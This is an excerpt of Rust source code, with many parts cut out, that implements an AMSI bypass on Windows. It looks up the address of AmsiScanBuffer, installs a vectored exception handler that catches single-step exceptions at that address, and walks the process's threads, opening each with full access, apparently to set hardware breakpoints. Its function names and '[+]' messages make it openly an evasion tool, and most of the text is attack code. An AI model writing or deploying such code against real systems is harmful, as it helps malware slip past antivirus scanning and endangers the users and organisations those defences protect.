...
use windows::Win32::Foundation::{
    CloseHandle, EXCEPTION_SINGLE_STEP, HANDLE, INVALID_HANDLE_VALUE, STATUS_SUCCESS,
};
...
use windows::Win32::System::{
    Diagnostics::Debug::AddVectoredExceptionHandler, LibraryLoader::GetModuleHandleA,
};
        ...
        if exception_code == EXCEPTION_SINGLE_STEP {
            if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
                if exception_address == amsi_address as usize {
                    println!("[+] amsi invoked: {:#X}", exception_address);
...
pub fn setup_bypass() -> Result<*mut c_void, String> {
    ...
    unsafe {
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            ...
            let amsi_scan_buffer: Option<unsafe extern "system" fn() -> isize> =
            ...
            match amsi_scan_buffer {
                ...
                None => {
                    return Err("Failed to get address for amsi Scan Buffer".to_string());
                }
            }
        }
        ...
        Ok(handle) => {
            ...
            loop {
                if stThEntry.th32OwnerProcessID == process_id as u32 {
                    ...
                    let thread_handle =
                        unsafe { OpenThread(THREAD_ALL_ACCESS, false, stThEntry.th32ThreadID) };
                    match thread_handle {
                        Ok(handle) => {
